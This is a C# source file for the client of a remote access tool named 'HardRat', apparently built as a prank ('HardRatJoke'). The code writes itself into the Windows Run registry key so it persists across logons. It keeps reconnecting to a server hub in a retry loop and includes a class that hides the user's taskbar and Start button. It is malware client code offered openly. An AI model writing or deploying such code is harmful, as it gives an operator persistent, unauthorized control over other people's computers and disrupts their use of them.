using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace HardRat.ClientApp
{
    class Program
    {
        static void Main(string[] args)
        {
            restart:
            SetStartup();
            var connection = new ServerHubConnection();
            try
            {
                connection.StartAsync()?.GetAwaiter().GetResult();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                goto restart;
            }



            Task.Delay(-1).GetAwaiter().GetResult();
        }

        private static void SetStartup()
        {
            const string AppName = "HardRatJoke";

            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            var loc = Path.Combine(Directory.GetCurrentDirectory(), "HardRat.ClientApp.exe");

             

            Console.WriteLine(loc);
            rk.SetValue(AppName, loc);

        }
    }

    public class Taskbar
    {
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int FindWindow(string className, string windowText);

        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);

        [DllImport("user32.dll")]
        private static extern int GetDesktopWindow();

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 1;

        protected static int Handle
        {
            get
            {
                return FindWindow("Shell_TrayWnd", "");
            }
        }

        protected static int HandleOfStartButton
        {
            get
            {
                int handleOfDesktop = GetDesktopWindow();
                int handleOfStartButton = FindWindowEx(handleOfDesktop, 0, "button", 0);
                return handleOfStartButton;
            }
        }

        private Taskbar()
        {
            // hide ctor
        }

        public static void Show()
        {
            ShowWindow(Handle, SW_SHOW);
            ShowWindow(HandleOfStartButton, SW_SHOW);
        }

        public static void Hide()
        {
            ShowWindow(Handle, SW_HIDE);
            ShowWindow(HandleOfStartButton, SW_HIDE);
        }
    }
}
